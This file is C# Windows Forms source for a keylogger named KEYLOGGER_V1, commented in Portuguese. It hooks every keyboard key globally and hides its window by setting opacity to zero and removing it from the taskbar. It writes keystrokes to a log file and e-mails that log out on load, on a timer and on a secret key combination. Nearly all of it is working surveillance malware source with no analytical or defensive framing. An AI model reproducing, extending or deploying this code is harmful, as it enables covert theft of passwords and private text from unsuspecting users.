using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace KEYLOGGER_V1
{
    public partial class FrmHome : Form
    { 
        public FrmHome()//METODO CONSTRUTOR.
        {
            InitializeComponent();
        }

//------------------------------------------------------------------[EVENTOS]--------------------------------------------------------------------------------------           
        private void FrmHome_Load(object sender, EventArgs e)                  //EVENTO: Inicialização do formulário, para verificações Iniciais.
        {   
            Hide(true);                   
            MetodosDeEventosHook();       

            c_Enviar_Email email = new c_Enviar_Email();

            if (email.Verifica_Existencia_Log(@"C:\Key\Keylogger.txt"))    
            {
                if (email.Verifica_Conexao_Web())  
                {
                    email.Enviar_Email_Log(@"C:\Key\Keylogger.txt"); 
                    File.Delete(@"C:\Key\Keylogger.txt");
                }

            }

        }
        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  //EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
        {
            String AtalhoDeVisibilidade = "[Ctrl][Delete][Esc]"; // Deixa Invisivel ou visivel
            String AtalhoDeFechamento = "[Ctrl][Esc][Esc]";      // Fecha.
            String AtalhoDeEnviarEmail = "[Ctrl][Home][End]";    // Envia Informações por email ou Cria log.

            if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeVisibilidade) == AtalhoDeVisibilidade)
            {
                if (this.Opacity == 0 && this.ShowInTaskbar == false)             
                {
                    Hide(false);

                }
                else
                {

                    Hide(true);

                }
            }
            else
            {
                if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeFechamento) == AtalhoDeFechamento)
                {
                    Application.Exit();
                }
                else 
                {
                    if (TeclaAtalhos(txtTextoDigitado.Text, AtalhoDeEnviarEmail) == AtalhoDeEnviarEmail) 
                    {
                        c_Enviar_Email email = new c_Enviar_Email();
                        email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text, @"C:\Key\Keylogger.txt");
                        txtTextoDigitadoLimpo.Clear();
                    }
                }
            }
            
        }
        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
        {
            File.Delete(@"C:\Key\Keylogger.txt"); 
            c_Enviar_Email email = new c_Enviar_Email();
            email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text, @"C:\Key\Keylogger.txt");
            txtTextoDigitadoLimpo.Clear();
        }
        private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
        {
             c_Enviar_Email email = new c_Enviar_Email();
             email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text,@"C:\Key\Keylogger.txt");
             txtTextoDigitadoLimpo.Clear();
        }
     




//------------------------------------------------------------------[METODOS]---------------------------------------------------------------------------------------        

        bool _ShiftPressionado = false;
        String Monitoramento_Geral_Teclas(String Key)                          //METODO: Mapeamento de teclas, e Comparação das teclas para substituição, Evento de ações.
        {

            switch (Key)
            {

                case "LWin":
                    return "[Win]";
                case "LControlKey":
                    return "[Ctrl]";
                case "RControlKey":
                    return "[Ctrl]";
                case "LMenu":
                    return "[Alt]";
                case "RMenu":
                    return "[Alt]";

                case "Return":
                    txtTextoDigitadoLimpo.Text += Environment.NewLine; // pula uma linha no "txtTextoDigitadoLimpo".
                    return "[Enter]";
                case "Space":
                    txtTextoDigitadoLimpo.Text += " "; // Da um espaço no "txtTextoDigitadoLimpo".
                    return "[Space]";
                case "LShiftKey":
                    _ShiftPressionado = true;
                    return "[Shift]";
                case "RShiftKey":
                    _ShiftPressionado = true;
                    return "[Shift]";
                case "Capital":
                    return "[Caps Lock]";
                case "Tab":
                    return "[Tab]";
                case "Oemtilde":
                    return "'";
                case "Escape":
                    return "[Esc]";
                case "Back":
                    try
                    {
                        txtTextoDigitadoLimpo.Text = txtTextoDigitadoLimpo.Text.Substring(0, txtTextoDigitadoLimpo.Text.Length - 1);
                        //Apaga o ultimo caracter digitado na linha.
                        return "[Back]";
                    }
                    catch (Exception) { return ""; }          
                case "PrintScreen":
                    return "[Print Screen]";
                case "Pause":
                    return "[Pause Break]";
                case "Insert":
                    return "[Insert]";
                case "Delete":
                    return "[Delete]";
                case "Home":
                    return "[Home]";
                case "PageUp":
                    return "[Page Up]";
                case "Next":
                    return "[Page Down]";
                case "End":
                    return "[End]";
                case "Apps":
                    return "[Menu]";
                case "Up":
                    return "[Up]";
                case "Down":
                    return "[Down]";
                case "Right":
                    return "[Right]";
                case "Left":
                    return "[Left]";
                case "Oemplus":
                    return "=";
                case "OemMinus":
                    return "-";
                case "Oem6":
                    return "[";
                case "Oem5":
                    return "]";
                case "Oem7":
                    return "";
                case "OemOpenBrackets":
                    return "´";
                case "Oem1":
                    return "Ç";
                case "Oemcomma":
                    return ",";
                case "OemPeriod":
                    return ".";
                case "OemQuestion":
                    return ";";
                case "D1":
                    return "1";
                case "D2":
                    return "2";
                case "D3":
                    return "3";
                case "D4":
                    return "4";
                case "D5":
                    return "5";
                case "D6":
                    return "6";
                case "D7":
                    return "7";
                case "D8":
                    return "8";
                case "D9":
                    return "9";
                case "D0":
                    return "0";
                case "F1":
                    return "[F1]";
                case "F2":
                    return "[F2]";
                case "F3":
                    return "[F3]";
                case "F4":
                    return "[F4]";
                case "F5":
                    return "[F5]";
                case "F6":
                    return "[F6]";
                case "F7":
                    return "[F7]";
                case "F8":
                    return "[F8]";
                case "F9":
                    return "[F9]";
                case "F10":
                    return "[F10]";
                case "F11":
                    return "[F11]";
                case "F12":
                    return "[F12]";
                default:

                    return Key;
            }


        }
        public string Monitoramento_Maisculas_Minusculas(string tecla)         //METODO: Monitora digitação de letras com o Capslook ou Shift Ativo.
        {
            string segundoCaracter = null;

            try
            {
                string primeiroCaracter = tecla.Substring(0, 1);

                segundoCaracter = tecla.Substring(1, 1);

                return "";

            }
            catch (Exception)
            {
                string teclasAlteradas;


                if (Control.IsKeyLocked(Keys.CapsLock))
                {
                    if (_ShiftPressionado == true)
                    {

                        teclasAlteradas = tecla.ToLower();
                        _ShiftPressionado = false;
                    }
                    else
                    {
                        teclasAlteradas = tecla.ToUpper();
                    }
                }
                else
                {
                    if (_ShiftPressionado != true)
                    {

                        teclasAlteradas = tecla.ToLower();

                    }
                    else
                    {
                        teclasAlteradas = tecla.ToUpper();
                        _ShiftPressionado = false;
                    }
                }


                return teclasAlteradas;

            }


        }
        void Hide(bool key)                                                    //METODO: torna o formulário invisivel 
        {
            if (key)
            {

                this.Opacity = 0;
                this.ShowInTaskbar = false;
            }
            else
            {
                this.Opacity = 100;
                this.ShowInTaskbar = true;
            }
        }
        String TeclaAtalhos(String texto, String caracter)                     //METODO:  verifica a sequência de Tecla digitada.
        {

            int contCarac = caracter.Length;
            int contText = texto.Length;

            if (contText >= contCarac)
            {
                int result = contText - contCarac;
                String caracteres = texto.Substring(result, contCarac);
                return caracteres;
            }
            else
            {
                return texto;
            }


        }




//------------------------------------------------------------------[REFERENTE A CLASSE HOOK]-----------------------------------------------------------------------


        //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
        globalKeyboardHook gkh = new globalKeyboardHook();
                                              

        void gkh_KeyDown(object sender, KeyEventArgs e)           //EVENTO: do HOOK para scaneamento das teclas
        {
            // TEXTO com todos as Teclas nomeadas.
            txtTextoDigitado.Text += Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode));
            // TEXTO com as teclas editadas.
            txtTextoDigitadoLimpo.Text += Monitoramento_Maisculas_Minusculas(Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode)));
        }
        private void HookAll()                                    //METODO: pega o enumerador da tecla e substitui por uma sequencia de caracteres
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }
        void MetodosDeEventosHook()                               //METODO: Ativa os eventos do HOOK(scan das teclas) 
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }
       
       
    }
}
